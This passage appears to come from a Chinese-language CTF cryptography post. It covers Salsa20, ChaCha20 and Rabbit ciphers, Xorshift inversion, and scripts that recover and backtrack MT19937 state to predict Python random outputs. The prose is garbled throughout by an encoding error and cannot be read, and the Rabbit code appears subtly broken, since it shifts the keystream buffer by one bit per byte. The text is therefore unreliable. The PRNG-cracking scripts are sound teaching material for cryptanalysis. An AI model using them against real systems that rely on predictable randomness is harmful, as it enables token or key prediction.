¸å‡½æ•°å…·ä½“å®ç°å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526#define R(a,b) (((a) &lt;&lt; (b)) | ((a) &gt;&gt; (32 - (b))))void salsa20_word_specification(uint32 out[16],uint32 in[16])&#123; int i; uint32 x[16]; for (i = 0;i &lt; 16;++i) x[i] = in[i]; for (i = 20;i &gt; 0;i -= 2) &#123; // 20è½®è®¡ç®— x[ 4] ^= R(x[ 0]+x[12], 7); x[ 8] ^= R(x[ 4]+x[ 0], 9); x[12] ^= R(x[ 8]+x[ 4],13); x[ 0] ^= R(x[12]+x[ 8],18); x[ 9] ^= R(x[ 5]+x[ 1], 7); x[13] ^= R(x[ 9]+x[ 5], 9); x[ 1] ^= R(x[13]+x[ 9],13); x[ 5] ^= R(x[ 1]+x[13],18); x[14] ^= R(x[10]+x[ 6], 7); x[ 2] ^= R(x[14]+x[10], 9); x[ 6] ^= R(x[ 2]+x[14],13); x[10] ^= R(x[ 6]+x[ 2],18); x[ 3] ^= R(x[15]+x[11], 7); x[ 7] ^= R(x[ 3]+x[15], 9); x[11] ^= R(x[ 7]+x[ 3],13); x[15] ^= R(x[11]+x[ 7],18); x[ 1] ^= R(x[ 0]+x[ 3], 7); x[ 2] ^= R(x[ 1]+x[ 0], 9); x[ 3] ^= R(x[ 2]+x[ 1],13); x[ 0] ^= R(x[ 3]+x[ 2],18); x[ 6] ^= R(x[ 5]+x[ 4], 7); x[ 7] ^= R(x[ 6]+x[ 5], 9); x[ 4] ^= R(x[ 7]+x[ 6],13); x[ 5] ^= R(x[ 4]+x[ 7],18); x[11] ^= R(x[10]+x[ 9], 7); x[ 8] ^= R(x[11]+x[10], 9); x[ 9] ^= R(x[ 8]+x[11],13); x[10] ^= R(x[ 9]+x[ 8],18); x[12] ^= R(x[15]+x[14], 7); x[13] ^= R(x[12]+x[15], 9); x[14] ^= R(x[13]+x[12],13); x[15] ^= R(x[14]+x[13],18); &#125; for (i = 0;i &lt; 16;++i) out[i] = x[i] + in[i]; // è¾“å…¥çŸ©é˜µç»è¿‡20è½®çš„è®¡ç®—ç»“æœå’ŒåŸå§‹çŸ©é˜µç›¸åŠ å¾—åˆ°æœ€ç»ˆè¾“å‡º&#125; è¾“å‡º æ¯ä¸€æ¬¡æ ¸å‡½æ•°è¿ç®—ï¼Œéƒ½èƒ½å¤Ÿé€šè¿‡keyã€nonceã€block-counterç”Ÿæˆ64å­—èŠ‚çš„è¾“å‡ºblockï¼Œç»è¿‡å¤šæ¬¡è¾“å…¥å’Œæ ¸å‡½æ•°è¿ç®—ï¼Œå°†æ¯ä¸€æ¬¡çš„ç”Ÿæˆç»“æœæ‹¼æ¥æœ€ç»ˆç»„æˆé•¿åº¦ä¸º $2^{70}$ çš„å­—èŠ‚æµã€‚ 1234567891011121314# Encryptfrom Crypto.Cipher import Salsa20plaintext = b&#x27;Attack at dawn&#x27;secret = b&#x27;*Thirty-two byte (256 bits) key*&#x27;cipher = Salsa20.new(key=secret)msg = cipher.nonce + cipher.encrypt(plaintext)# Decryptfrom Crypto.Cipher import Salsa20secret = b&#x27;*Thirty-two byte (256 bits) key*&#x27;msg_nonce = msg[:8]ciphertext = msg[8:]cipher = Salsa20.new(key=secret, nonce=msg_nonce)plaintext = cipher.decrypt(ciphertext) â€‹ Chacha20Chacha20æ˜¯ChaChaç³»åˆ—æµå¯†ç ï¼Œä½œä¸ºSalsaå¯†ç çš„æ”¹è‰¯ç‰ˆï¼Œå…·æœ‰æ›´å¼ºçš„æŠµæŠ—å¯†ç åˆ†ææ”»å‡»çš„ç‰¹æ€§ï¼Œâ€œ20â€è¡¨ç¤ºè¯¥ç®—æ³•æœ‰20è½®çš„åŠ å¯†è®¡ç®—ã€‚ ç”±äºæ˜¯æµå¯†ç ï¼Œæ•…ä»¥å­—èŠ‚ä¸ºå•ä½è¿›è¡ŒåŠ å¯†ï¼Œå®‰å…¨æ€§çš„å…³é”®ä½“ç°åœ¨å¯†é’¥æµç”Ÿæˆçš„è¿‡ç¨‹ï¼Œå³æ‰€ä¾èµ–çš„ä¼ªéšæœºæ•°ç”Ÿæˆå™¨ï¼ˆPRNGï¼‰çš„å¼ºåº¦ï¼ŒåŠ å¯†è¿‡ç¨‹å³æ˜¯å°†å¯†é’¥æµä¸æ˜æ–‡é€å­—èŠ‚å¼‚æˆ–å¾—åˆ°å¯†æ–‡ï¼Œåä¹‹ï¼Œè§£å¯†æ˜¯å°†å¯†æ–‡å†ä¸å¯†é’¥æµåšä¸€æ¬¡å¼‚æˆ–è¿ç®—å¾—åˆ°æ˜æ–‡ã€‚ 1234567891011121314# Encryptfrom Crypto.Cipher import ChaCha20plaintext = b&#x27;Attack at dawn&#x27;secret = b&#x27;*Thirty-two byte (256 bits) key*&#x27;cipher = ChaCha20.new(key=secret)msg = cipher.nonce + cipher.encrypt(plaintext)# Decryptfrom Crypto.Cipher import ChaCha20secret = b&#x27;*Thirty-two byte (256 bits) key*&#x27;msg_nonce = msg[:8]ciphertext = msg[8:]cipher = ChaCha20.new(key=secret, nonce=msg_nonce)plaintext = cipher.decrypt(ciphertext) â€‹ RabbitRabbit æ˜¯ä¸€ç§é«˜é€Ÿæµå¯†ç ï¼Œäº 2003 å¹´åœ¨ FSE ç ”è®¨ä¼šä¸Šé¦–æ¬¡æå‡ºã€‚Rabbit ä½¿ç”¨ä¸€ä¸ª 128 ä½å¯†é’¥å’Œä¸€ä¸ª 64 ä½åˆå§‹åŒ–å‘é‡ã€‚è¯¥åŠ å¯†ç®—æ³•çš„æ ¸å¿ƒç»„ä»¶æ˜¯ä¸€ä¸ªä½æµç”Ÿæˆå™¨ï¼Œè¯¥æµç”Ÿæˆå™¨æ¯æ¬¡è¿­ä»£éƒ½ä¼šåŠ å¯† 128 ä¸ªæ¶ˆæ¯ä½ã€‚Rabbit ä¹Ÿæ˜¯ä¸€ç§å¯¹ç§°åŠ å¯†ç®—æ³•ã€‚ ä¸åŠ ç›ç‰ˆæœ¬ï¼šhttps://asecuritysite.com/encryption/rabbit2 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230import collectionsimport hashlibimport randomimport rabbitimport binasciiimport sysdef enc_long(n): &#x27;&#x27;&#x27;Encodes arbitrarily large number n to a sequence of bytes. Big endian byte order is used.&#x27;&#x27;&#x27; s = &quot;&quot; while n &gt; 0: s = chr(n &amp; 0xFF) + s n &gt;&gt;= 8 return sWORDSIZE = 0x100000000rot08 = lambda x: ((x &lt;&lt; 8) &amp; 0xFFFFFFFF) | (x &gt;&gt; 24)rot16 = lambda x: ((x &lt;&lt; 16) &amp; 0xFFFFFFFF) | (x &gt;&gt; 16)def _nsf(u, v): &#x27;&#x27;&#x27;Internal non-linear state transition&#x27;&#x27;&#x27; s = (u + v) % WORDSIZE s = s * s return (s ^ (s &gt;&gt; 32)) % WORDSIZEclass Rabbit: def __init__(self, key, iv = None): &#x27;&#x27;&#x27;Initialize Rabbit cipher using a 128 bit integer/string&#x27;&#x27;&#x27; if isinstance(key, str): # interpret key string in big endian byte order if len(key) &lt; 16: key = &#x27;\\x00&#x27; * (16 - len(key)) + key # if len(key) &gt; 16 bytes only the first 16 will be considered k = [ord(key[i + 1]) | (ord(key[i]) &lt;&lt; 8) for i in range(14, -1, -2)] else: # k[0] = least significant 16 bits # k[7] = most significant 16 bits k = [(key &gt;&gt; i) &amp; 0xFFFF for i in range(0, 128, 16)] # State and counter initialization x = [(k[(j + 5) % 8] &lt;&lt; 16) | k[(j + 4) % 8] if j &amp; 1 else (k[(j + 1) % 8] &lt;&lt; 16) | k[j] for j in range(8)] c = [(k[j] &lt;&lt; 16) | k[(j + 1) % 8] if j &amp; 1 else (k[(j + 4) % 8] &lt;&lt; 16) | k[(j + 5) % 8] for j in range(8)] self.x = x self.c = c self.b = 0 self._buf = 0 # output buffer self._buf_bytes = 0 # fill level of buffer next(self) next(self) next(self) next(self) for j in range(8): c[j] ^= x[(j + 4) % 8] self.start_x = self.x[:] # backup initial key for IV/reset self.start_c = self.c[:] self.start_b = self.b if iv != None: self.set_iv(iv) def reset(self, iv = None): &#x27;&#x27;&#x27;Reset the cipher and optionally set a new IV (int64 / string).&#x27;&#x27;&#x27; self.c = self.start_c[:] self.x = self.start_x[:] self.b = self.start_b self._buf = 0 self._buf_bytes = 0 if iv != None: self.set_iv(iv) def set_iv(self, iv): &#x27;&#x27;&#x27;Set a new IV (64 bit integer / bytestring).&#x27;&#x27;&#x27; if isinstance(iv, str): i = 0 for c in iv: i = (i &lt;&lt; 8) | ord(c) iv = i c = self.c i0 = iv &amp; 0xFFFFFFFF i2 = iv &gt;&gt; 32 i1 = ((i0 &gt;&gt; 16) | (i2 &amp; 0xFFFF0000)) % WORDSIZE i3 = ((i2 &lt;&lt; 16) | (i0 &amp; 0x0000FFFF)) % WORDSIZE c[0] ^= i0 c[1] ^= i1 c[2] ^= i2 c[3] ^= i3 c[4] ^= i0 c[5] ^= i1 c[6] ^= i2 c[7] ^= i3 next(self) next(self) next(self) next(self) def __next__(self): &#x27;&#x27;&#x27;Proceed to the next internal state&#x27;&#x27;&#x27; c = self.c x = self.x b = self.b t = c[0] + 0x4D34D34D + b c[0] = t % WORDSIZE t = c[1] + 0xD34D34D3 + t // WORDSIZE c[1] = t % WORDSIZE t = c[2] + 0x34D34D34 + t // WORDSIZE c[2] = t % WORDSIZE t = c[3] + 0x4D34D34D + t // WORDSIZE c[3] = t % WORDSIZE t = c[4] + 0xD34D34D3 + t // WORDSIZE c[4] = t % WORDSIZE t = c[5] + 0x34D34D34 + t // WORDSIZE c[5] = t % WORDSIZE t = c[6] + 0x4D34D34D + t // WORDSIZE c[6] = t % WORDSIZE t = c[7] + 0xD34D34D3 + t // WORDSIZE c[7] = t % WORDSIZE b = t // WORDSIZE g = [_nsf(x[j], c[j]) for j in range(8)] x[0] = (g[0] + rot16(g[7]) + rot16(g[6])) % WORDSIZE x[1] = (g[1] + rot08(g[0]) + g[7]) % WORDSIZE x[2] = (g[2] + rot16(g[1]) + rot16(g[0])) % WORDSIZE x[3] = (g[3] + rot08(g[2]) + g[1]) % WORDSIZE x[4] = (g[4] + rot16(g[3]) + rot16(g[2])) % WORDSIZE x[5] = (g[5] + rot08(g[4]) + g[3]) % WORDSIZE x[6] = (g[6] + rot16(g[5]) + rot16(g[4])) % WORDSIZE x[7] = (g[7] + rot08(g[6]) + g[5]) % WORDSIZE self.b = b return self def derive(self): &#x27;&#x27;&#x27;Derive a 128 bit integer from the internal state&#x27;&#x27;&#x27; x = self.x return ((x[0] &amp; 0xFFFF) ^ (x[5] &gt;&gt; 16)) | \\ (((x[0] &gt;&gt; 16) ^ (x[3] &amp; 0xFFFF)) &lt;&lt; 16)| \\ (((x[2] &amp; 0xFFFF) ^ (x[7] &gt;&gt; 16)) &lt;&lt; 32)| \\ (((x[2] &gt;&gt; 16) ^ (x[5] &amp; 0xFFFF)) &lt;&lt; 48)| \\ (((x[4] &amp; 0xFFFF) ^ (x[1] &gt;&gt; 16)) &lt;&lt; 64)| \\ (((x[4] &gt;&gt; 16) ^ (x[7] &amp; 0xFFFF)) &lt;&lt; 80)| \\ (((x[6] &amp; 0xFFFF) ^ (x[3] &gt;&gt; 16)) &lt;&lt; 96)| \\ (((x[6] &gt;&gt; 16) ^ (x[1] &amp; 0xFFFF)) &lt;&lt; 112) def keystream(self, n): &#x27;&#x27;&#x27;Generate a keystream of n bytes&#x27;&#x27;&#x27; res = &quot;&quot; b = self._buf j = self._buf_bytes next = self.__next__ derive = self.derive for i in range(n): if not j: j = 16 next() b = derive() res += chr(b &amp; 0xFF) j -= 1 b &gt;&gt;= 1 self._buf = b self._buf_bytes = j return res def encrypt(self, data): &#x27;&#x27;&#x27;Encrypt/Decrypt data of arbitrary length.&#x27;&#x27;&#x27; res = &quot;&quot; b = self._buf j = self._buf_bytes next = self.__next__ derive = self.derive for c in data: if not j: # empty buffer =&gt; fetch next 128 bits j = 16 next() b = derive() res += chr(ord(c) ^ (b &amp; 0xFF)) j -= 1 b &gt;&gt;= 1 self._buf = b self._buf_bytes = j return res decrypt = encryptmessage=&quot;Hello&quot;key=&quot;qwerty&quot;iv=0key1 = hashlib.md5(key.encode()).hexdigest()print(&quot;Message:\\t\\t&quot;,message)print(&quot;IV:\\t&quot;,iv)print(&quot;Encryption password:\\t&quot;,key)print(&quot;Encryption key:\\t\\t&quot;,key1)print(&quot;\\n======Rabbit encryption========&quot;)iv=0msg=Rabbit(key1,iv).encrypt(message)print(&quot;Encrypted:\\t&quot;,binascii.hexlify(msg.encode()))text=Rabbit(key1,iv).decrypt(msg)print(&quot;Decrypted:\\t&quot;,text) â€‹ XorshiftXorshift éšæœºæ•°ç”Ÿæˆå™¨æ˜¯ George Marsaglia å‘æ˜çš„ä¸€ç±»ä¼ªéšæœºæ•°ç”Ÿæˆå™¨ã€‚å®ƒä»¬é€šè¿‡å’Œè‡ªå·±é€»è¾‘ç§»ä½åçš„æ•°è¿›è¡Œå¼‚æˆ–æ“ä½œæ¥ç”Ÿæˆåºåˆ—ä¸­çš„ä¸‹ä¸€ä¸ªæ•°ã€‚è¿™åœ¨ç°ä»£è®¡ç®—æœºä½“ç³»ç»“æ„éå¸¸å¿«ã€‚å®ƒä»¬æ˜¯çº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨çš„ä¸€ä¸ªå­ç±»ï¼Œå…¶ç®€å•çš„å®ç°ä½¿å®ƒä»¬é€Ÿåº¦æ›´å¿«ä¸”ä½¿ç”¨æ›´å°‘çš„ç©ºé—´ã€‚ç„¶è€Œï¼Œå¿…é¡»ä»”ç»†é€‰æ‹©åˆé€‚å‚æ•°ä»¥è¾¾åˆ°é•¿å‘¨æœŸã€‚ é—®é¢˜ï¼šåœ¨å¾ªç¯ç§»ä½å¼‚æˆ–åŠ å¯†ä¸­ï¼Œæˆ‘ä»¬å·²çŸ¥å˜æ¢åçš„å¯†æ–‡ y ï¼Œä»¥åŠå¤šä¸ªåç§»çš„å¯†é’¥ ks ï¼Œè¦æ±‚å‡ºåŸæ–‡ xã€‚ å®šç†ï¼šåœ¨é•¿åº¦ä¸º 2 çš„æ–¹å¹‚çš„äºŒè¿›åˆ¶ä¸²ä¸­ï¼Œå¾ªç¯ç§»ä½å¼‚æˆ–å˜æ¢ä¸­ï¼Œå¦‚æœæœ‰å¥‡æ•°é¡¹ï¼Œé‚£ä¹ˆè¿™ä¸ªå˜æ¢æ˜¯å¯é€†çš„ï¼Œå¦åˆ™å°±æ˜¯ä¸å¯é€†çš„ã€‚ ä¾‹ï¼š åŠ å¯†ï¼š$y=x \\oplus (x \\ggg p) \\oplus (x \\ggg q)$ è§£å¯†ï¼š$x=x \\oplus (y \\ggg p) \\oplus (y \\ggg q)$ 123456789101112131415161718# y = x ^ (x&gt;&gt;&gt;p) ^ (x&gt;&gt;&gt;q)from operator import xorfrom functools import reducedef move(n, k): s = bin(n)[2:].zfill(64) k &amp;= 63 return int(s[k:] + s[:k], 2) def encrypt(x, ks): return xor(x, reduce(xor, map(lambda k: move(x, k), ks))) def decrypt(y, ks): for _ in range(6): y = encrypt(y, ks) ks = [k &lt;&lt; 1 for k in ks] return y â€‹ MT19937æ¢…æ£®æ—‹è½¬ç®—æ³•ï¼ˆMersenne Twister Algorithmï¼Œç®€ç§° MTï¼‰æ˜¯ä¸ºäº†è§£å†³è¿‡å»ä¼ªéšæœºæ•°å‘ç”Ÿå™¨ï¼ˆPseudo-Random Number Generatorï¼Œç®€ç§° PRNGï¼‰äº§ç”Ÿçš„ä¼ªéšæœºæ•°è´¨é‡ä¸é«˜è€Œæå‡ºçš„æ–°ç®—æ³•ã€‚è¯¥ç®—æ³•åœ¨ 1997 å¹´æå‡ºã€‚ Mersenne Twister æœ€å¸¸è§çš„å®ç°æ–¹å¼ä½¿ç”¨ 624 ä¸ª 32 bits çš„åˆå§‹çŠ¶æ€ã€‚è¿™äº›æ•´æ•°æŒ‰é¡ºåºåˆ†å‘ï¼ˆåˆ†å‘å‰å¯¹æ¯ä¸ªåˆå§‹æ•°è¿›è¡Œè½¬æ¢ï¼‰ï¼Œåˆ†å‘å®Œåå¯¹è¯¥çŠ¶æ€åº”ç”¨æŸç§ç®—æ³•ä»¥è·å–ä¸‹ä¸€ç»„ 624 ä¸ªæ•´æ•°ã€‚ä»¥åŠå¯ä»¥é€šè¿‡å¾—åˆ°è¿ç»­çš„ 624 ä¸ªè¾“å‡ºï¼Œè¿˜åŸå‡ºåŸæ¥çš„ 624 ä¸ª statesï¼Œå†æ ¹æ®åŸç®—æ³•æ¨ç®—å‡ºæ¥ä¸‹æ¥æ¯ä¸ª state ä¸‹ä¸€æ¬¡çš„ valueï¼Œä»è€Œç®—å‡ºæ¥ä¸‹æ¥çš„è¾“å‡ºã€‚ 32 bitså®ç°ï¼š 12345678910111213141516171819202122232425262728293031def _int32(x): return int(0xFFFFFFFF &amp; x) class MT19937: # æ ¹æ®seedåˆå§‹åŒ–624çš„state def __init__(self, seed): self.mt = [0] * 624 self.mt[0] = seed self.mti = 0 for i in range(1, 624): self.mt[i] = _int32(1812433253 * (self.mt[i - 1] ^ self.mt[i - 1] &gt;&gt; 30) + i) # æå–ä¼ªéšæœºæ•° def extract_number(self): if self.mti == 0: self.twist() y = self.mt[self.mti] y = y ^ y &gt;&gt; 11 y = y ^ y &lt;&lt; 7 &amp; 2636928640 y = y ^ y &lt;&lt; 15 &amp; 4022730752 y = y ^ y &gt;&gt; 18 self.mti = (self.mti + 1) % 624 return _int32(y) # å¯¹çŠ¶æ€è¿›è¡Œæ—‹è½¬ def twist(self): for i in range(0, 624): y = _int32((self.mt[i] &amp; 0x80000000) + (self.mt[(i + 1) % 624] &amp; 0x7fffffff)) self.mt[i] = (y &gt;&gt; 1) ^ self.mt[(i + 397) % 624] if y % 2 != 0: self.mt[i] = self.mt[i] ^ 0x9908b0df åˆ†ä¸ºä¸‰æ®µï¼š å¯¼å…¥seedï¼Œåˆå§‹åŒ–ä¼ªéšæœºæ•°å‘ç”Ÿå™¨ æ¯æ¬¡ç”Ÿæˆ mt[i] æ˜¯ç”±å‰ä¸€é¡¹è¿›è¡Œè¿ç®—å¾—åˆ°çš„ï¼Œç¬¬ä¸€é¡¹ mt[0] == seedï¼Œæ€»ç”Ÿæˆ 624 é¡¹æ•´æ•°çš„åˆ—è¡¨ï¼ˆä»¥åŠå…¶ä»–å‚æ•°ï¼‰ä½œä¸º stateã€‚ ä¸­é—´çš„å…ƒç»„ç±»å‹æœ‰ 625 é¡¹ï¼Œå‰ 624 é¡¹å³æ˜¯ä¹‹å‰æåˆ°çš„æ•´æ•°ï¼Œè€Œç¬¬ 625 é¡¹ï¼ˆæ­¤æ—¶ç­‰äº 624ï¼‰æ˜¯è¯¥ state æ­¤æ—¶å¯¹åº”çš„ç¬¬å‡ ä¸ªæ•´æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå†ä¸‹ä¸€æ¬¡æ‰§è¡Œ extract_number() å‡½æ•°æ—¶çš„ state é‡Œé¢åº”è¯¥è°ƒç”¨ç¬¬å‡ ä¸ªæ•´æ•°ã€‚ è¿›è¡Œ twist() å‡½æ•° æ³¨æ„æ˜¯åœ¨ extract_number() å‡½æ•°å†…å¯èƒ½ä¼šæ‰§è¡Œ twist()ï¼Œè¿›è¡Œ twist() å‡½æ•°éœ€è¦æ»¡è¶³çš„æ¡ä»¶ï¼Œä¹Ÿå°±æ˜¯æ¯ 624 é¡¹ä½œä¸ºä¸€è½®ç›´æ¥æ‰§è¡Œ extract_number() å‡½æ•°é‡Œåé¢çš„ä½è¿ç®—ä»¥åŠæŠ½å–éšæœºæ•°çš„æ“ä½œï¼Œè€Œä¸‹ä¸€è½® 624 é¡¹éœ€è¦è¿›è¡Œ twist() å‡½æ•°æ›¿æ¢stateã€‚ è¿™æ ·ä¸€æ¥ï¼Œå°±æ„å‘³ç€æ¯ 624 é¡¹çš„åˆ—è¡¨ä½œä¸ºä¸€æ¬¡ stateï¼Œå½“è¾“å‡ºå®Œ 624 ä¸ªä¼ªéšæœºæ•°ä¹‹åï¼Œéœ€è¦é€šè¿‡ twist() å‡½æ•°å˜æ¢ stateï¼Œå˜æ¢å®Œæˆä¹‹åå†è¿›è¡Œè¾“å‡ºä¼ªéšæœºæ•°ï¼Œä»¥æ­¤ç±»æ¨ã€‚ è®¾æ–°ç”Ÿæˆçš„ state åˆ—è¡¨ä¸º mt&#39;ï¼Œè€ŒåŸæ¥çš„ state åˆ—è¡¨ä¸º mtï¼ˆæ³¨æ„åœ¨MT19937åŸä»£ç ä¸­å¹¶æ²¡æœ‰èµ‹å€¼æ–°çš„åˆ—è¡¨ï¼Œåªæ˜¯ä¸æ–­åœ°æ›´æ–°åŸæ¥åœ°åˆ—è¡¨ï¼‰ åœ¨ twist() å‡½æ•°ä¸­ï¼Œæ¯ç”Ÿæˆçš„æ–°çš„ä¸€ä¸ª state åˆ—è¡¨ä¸­çš„ mt&#39;[i]ï¼Œåªå’Œåœ¨åŸæ¥çš„ state ä¸­çš„ mt[i+1] ä»¥åŠ mt[i+397] æœ‰å…³ã€‚ è€Œå½“ i+1 æˆ–è€… i+397 å¤§äº 624 æ—¶ï¼Œä¹Ÿå°±æ˜¯è¶…è¿‡äº†ä¸€ä¸ª state åˆ—è¡¨æ€»é•¿åº¦æ—¶ï¼Œé‚£ä¹ˆ mt[i+1] æˆ–è€… mt[i+397] å®é™…ä¸Šæ˜¯ mt&#39;[(i+1) % 624] æˆ–è€… mt&#39;[(i+397) % 624]ã€‚ ç»§ç»­ extract_number() å‡½æ•° åœ¨åˆ¤æ–­æ‰§è¡Œ twist() å‡½æ•°ä¸å¦ä¹‹åï¼Œä»ç›®å‰çš„ state åˆ—è¡¨ä¸­å•ç‹¬æŠ½å–æ¯ä¸ªæ•°è¿›è¡Œè¿ç®—ï¼Œè¿ç®—ç»“æœå³æ˜¯è¾“å‡ºçš„éšæœºæ•°ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œstate åˆ—è¡¨é‡Œçš„æ¯ä¸ªæ•°éƒ½å•ç‹¬çš„è¿›è¡Œä¸å¸¸é‡çš„ä½è¿ç®—ã€‚ randomæ¨¡å—getrandbits å‡½æ•°åœ¨æ”¶åˆ°è¶…å‡º32æ¯”ç‰¹çš„å‚æ•°ï¼Œä¼šæŠŠå·²ç”Ÿæˆçš„stateæ”¾åœ¨ä½ä½ï¼Œé«˜ä½æ”¾ç½®æ–°ç”Ÿæˆçš„stateã€‚ æ”»å‡»æ±‚åéšæœºæ•°ï¼ˆé€† extract_numberï¼‰å‡è®¾å·²çŸ¥624ä¸ªä»å¼€å§‹è¿ç»­è¾“å‡ºçš„éšæœºæ•°ï¼Œéœ€è¦é¢„æµ‹ä¹‹åæ¯ä¸€ä¸ªè¾“å‡ºçš„éšæœºæ•°ï¼Œåªéœ€è¦é€†è½¬è¾“å‡ºçš„éšæœºæ•°ç»„æˆ stateåˆ—è¡¨ï¼Œç„¶åè®¾ç½®ä¼ªéšæœºæ•°å‘ç”Ÿå™¨çš„ state å³å¯ï¼Œç„¶åè¾“å‡ºéœ€è¦é¢„æµ‹çš„éšæœºæ•°ã€‚ Mersenne Twister Predictor https://github.com/kmyk/mersenne-twister-predictor 123456789import randomfrom mt19937predictor import MT19937Predictorpredictor = MT19937Predictor()for _ in range(624): x = random.getrandbits(32) predictor.setrandbits(x, 32)assert random.getrandbits(32) == predictor.getrandbits(32) randcrack https://github.com/tna0y/Python-random-module-cracker 12345678910111213import random, timefrom randcrack import RandCrackrandom.seed(time.time())rc = RandCrack()for i in range(624): rc.submit(random.getrandbits(32)) # Could be filled with random.randint(0,4294967294) or random.randrange(0,4294967294)print(&quot;Random result: &#123;&#125;\\nCracker result: &#123;&#125;&quot; .format(random.randrange(0, 4294967295), rc.predict_randrange(0, 4294967295))) åŸå§‹ 12345678910111213141516171819202122232425262728293031323334353637383940# è„šæœ¬1# right shift inversedef inverse_right(res, shift, bits=32): tmp = res for i in range(bits // shift): tmp = res ^ tmp &gt;&gt; shift return tmp# right shift with mask inversedef inverse_right_mask(res, shift, mask, bits=32): tmp = res for i in range(bits // shift): tmp = res ^ tmp &gt;&gt; shift &amp; mask return tmp# left shift inversedef inverse_left(res, shift, bits=32): tmp = res for i in range(bits // shift): tmp = res ^ tmp &lt;&lt; shift return tmp# left shift with mask inversedef inverse_left_mask(res, shift, mask, bits=32): tmp = res for i in range(bits // shift): tmp = res ^ tmp &lt;&lt; shift &amp; mask return tmpdef recover(y): y = inverse_right(y,18) y = inverse_left_mask(y,15,4022730752) y = inverse_left_mask(y,7,2636928640) y = inverse_right(y,11) return y&amp;0xffffffffrandom_number = []state = [recover(i) for i in random_number] 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950# è„šæœ¬2from random import Randomdef invert_right(m,l,val=&#x27;&#x27;): length = 32 mx = 0xffffffff if val == &#x27;&#x27;: val = mx i,res = 0,0 while i*l&lt;length: mask = (mx&lt;&lt;(length-l)&amp;mx)&gt;&gt;i*l tmp = m &amp; mask m = m^tmp&gt;&gt;l&amp;val res += tmp i += 1 return resdef invert_left(m,l,val): length = 32 mx = 0xffffffff i,res = 0,0 while i*l &lt; length: mask = (mx&gt;&gt;(length-l)&amp;mx)&lt;&lt;i*l tmp = m &amp; mask m ^= tmp&lt;&lt;l&amp;val res |= tmp i += 1 return resdef invert_temper(m): m = invert_right(m,18) m = invert_left(m,15,4022730752) m = invert_left(m,7,2636928640) m = invert_right(m,11) return mdef clone_mt(record): state = [invert_temper(i) for i in record] gen = Random() gen.setstate((3,tuple(state+[0]),None)) return genprng = []g = clone_mt(prng[:624])for i in range(700): g.getrandbits(32)key = g.getrandbits(32)print(key) æ±‚å‰éšæœºæ•°ï¼ˆé€† twist()ï¼‰ Extend MT19937 Predictor https://github.com/NonupleBroken/ExtendMT19937Predictor 1234567891011121314import randomfrom extend_mt19937_predictor import ExtendMT19937Predictornumbers = [random.getrandbits(64) for _ in range(1024)]predictor = ExtendMT19937Predictor()for _ in range(78): predictor.setrandbits(random.getrandbits(256), 256)_ = [predictor.backtrack_getrandbits(256) for _ in range(78)]for x in numbers[::-1]: assert x == predictor.backtrack_getrandbits(64) å®Œæ•´ state å‡è®¾å·²çŸ¥è¯¥ state ä¸­çš„ 624 ä¸ªæ•´æ•°ï¼Œæƒ³è¦çŸ¥é“ä¹‹å‰è¾“å‡ºçš„éšæœºæ•°ï¼Œéœ€è¦é€†è½¬ twist() å¾—åˆ°ä¸Šä¸€ä¸ª state æˆ–è€…æ›´ä¹‹å‰çš„ stateã€‚ 12345678910111213141516171819202122232425262728def backtrace(cur): high = 0x80000000 low = 0x7fffffff mask = 0x9908b0df state = cur for i in range(623,-1,-1): tmp = state[i]^state[(i+397)%624] # recover Y,tmp = Y if tmp &amp; high == high: tmp ^= mask tmp &lt;&lt;= 1 tmp |= 1 else: tmp &lt;&lt;=1 # recover highest bit res = tmp&amp;high # recover other 31 bits,when i =0,it just use the method again it so beautiful!!!! tmp = state[i-1]^state[(i+396)%624] # recover Y,tmp = Y if tmp &amp; high == high: tmp ^= mask tmp &lt;&lt;= 1 tmp |= 1 else: tmp &lt;&lt;=1 res |= (tmp)&amp;low state[i] = res return state éƒ¨åˆ† state å‡è®¾å·²çŸ¥ 1000 ä¸ªä»å¼€å§‹ç¬¬ 5 ä¸ªè¾“å‡ºçš„è¿ç»­éšæœºæ•°ï¼Œæ±‚å‰ 4 ä¸ªè¾“å‡ºçš„éšæœºæ•°çš„å¤§å°ï¼ˆå‚è€ƒV&amp;N 2020 - backtraceï¼‰ã€‚ è¿™ 1000 ä¸ªéšæœºæ•°å¯ä»¥åˆ†æˆä¸¤æ®µï¼ˆå¯¹åº”ä¸åŒçš„ state ç”Ÿæˆçš„éšæœºæ•°ï¼‰ï¼Œä¹Ÿå°±æ˜¯å‰ 620 ä¸ªæ•°ä¸ºç¬¬ä¸€ä¸ª state ç”Ÿæˆçš„ï¼Œå 380 ä¸ªæ•°ä¸ºç¬¬äºŒä¸ª state ç”Ÿæˆçš„ï¼Œéœ€è¦æ±‚ç¬¬ä¸€ä¸ª state ç”Ÿæˆçš„å‰å››ä¸ªéšæœºæ•°ã€‚ 123456789101112131415161718192021222324def backtrace(cur): high = 0x80000000 low = 0x7fffffff mask = 0x9908b0df state = cur for i in range(3,-1,-1): tmp = state[i+624]^state[i+397] # mt&#x27;[i] == mt [i+624] if tmp &amp; high == high: tmp ^= mask tmp &lt;&lt;= 1 tmp |= 1 else: tmp &lt;&lt;=1 res = tmp&amp;high tmp = state[i-1+624]^state[i+396] if tmp &amp; high == high: tmp ^= mask tmp &lt;&lt;= 1 tmp |= 1 else: tmp &lt;&lt;=1 res |= (tmp)&amp;low state[i] = res return state 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384# è„šæœ¬from random import Random# right shift inversedef inverse_right(res,shift,bits=32): tmp = res for i in range(bits//shift): tmp = res ^ tmp &gt;&gt; shift return tmp# right shift with mask inversedef inverse_right_values(res,shift,mask,bits=32): tmp = res for i in range(bits//shift): tmp = res ^ tmp&gt;&gt;shift &amp; mask return tmp# left shift inversedef inverse_left(res,shift,bits=32): tmp = res for i in range(bits//shift): tmp = res ^ tmp &lt;&lt; shift return tmp# left shift with mask inversedef inverse_left_values(res,shift,mask,bits=32): tmp = res for i in 